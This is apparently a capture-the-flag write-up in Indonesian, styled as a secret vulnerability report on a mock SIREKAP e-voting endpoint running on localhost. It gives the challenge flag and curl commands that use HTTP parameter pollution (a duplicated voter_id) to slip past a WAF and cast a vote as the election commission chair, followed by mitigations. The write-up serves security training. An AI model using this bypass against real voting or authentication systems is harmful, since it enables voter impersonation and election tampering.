# 📑 Laporan Celah Keamanan SIREKAP v2.4

**Klasifikasi:** SANGAT RAHASIA (TOP SECRET)  
**Judul:** Bypass Autentikasi Suara via Manipulasi Parameter (HTTP Parameter Pollution)  
**Target:** Modul e-Voting (`/vote`)  
**Pelapor:** Cyber Security Force Indonesia

## Ringkasan Eksekutif
Ditemukan celah keamanan kritis pada mekanisme validasi NIK di sistem SIREKAP. Penyerang dapat memanipulasi permintaan suara (vote) untuk menyamar sebagai pejabat tinggi KPU (Ketua KPU) dengan memanfaatkan ketidakkonsistenan pembacaan parameter ganda.

**Flag:** `STELKCSC{p4r4m3t3r_p0llut10n_tw1n_1d3nt1ty}`

---

## Analisis Teknis (Root Cause)

Sistem memiliki ketidakkonsistenan logika antara Middleware Keamanan (WAF) dan Aplikasi Backend:
1.  **Middleware Keamanan**: Hanya memeriksa parameter `voter_id` **PERTAMA** untuk validasi sesi.
2.  **Aplikasi Backend**: Mengambil parameter `voter_id` **TERAKHIR** untuk memproses suara.

### Data Referensi NIK
- **Warga Sipil (Anda)**: `3174052001950005`
- **Ketua KPU (Target)**: `9999000011112222`

---

## Langkah Reproduksi (Proof of Concept)

### Skenario 1: Percobaan Ilegal Langsung
Mencoba mengganti NIK secara langsung akan ditolak oleh sistem keamanan.

```bash
# GAGAL: Terdeteksi manipulasi
curl -X POST http://localhost:5008/vote \
  -d "candidate_id=01&voter_id=9999000011112222"
```

**Respon:** `Peringatan Keamanan: NIK tidak cocok.`

### Skenario 2: Eksploitasi Parameter Ganda (HPP)
Kita mengirimkan parameter `voter_id` dua kali. Yang pertama adalah NIK sah kita (untuk menipu firewall), yang kedua adalah NIK Ketua KPU (untuk dieksekusi backend).

```bash
# SUKSES: Bypass WAF dan Eksekusi Admin
curl -X POST http://localhost:5008/vote \
  -d "candidate_id=02&voter_id=3174052001950005&voter_id=9999000011112222"
```

**Alur Eksekusi:**
1.  **WAF Checks**: `voter_id[0] == 3174...0005` (NIK Sesi Kita) -> **LOLOS (PASS)** ✅
2.  **Backend Uses**: `voter_id[-1] == 9999...2222` (NIK Ketua KPU) -> **EKSEKUSI** 🚀

### Hasil
Pada respon `success.html`, sistem akan menampilkan pesan "Verifikasi KPU Pusat" yang berisi Flag rahasia.

---

## Mitigasi & Rekomendasi
Untuk Tim IT KPU Pusat:
1.  **Normalisasi Input**: Tolak permintaan yang memiliki parameter ganda untuk field sensitif.
2.  **Konsistensi Parser**: Pastikan WAF dan Backend menggunakan logika parsing HTTP yang identik (Standarisasi RFC).
3.  **Validasi Ketat**: Gunakan data dari sesi sisi server (`session['nik']`) daripada mempercayai input pengguna (`request.form`).
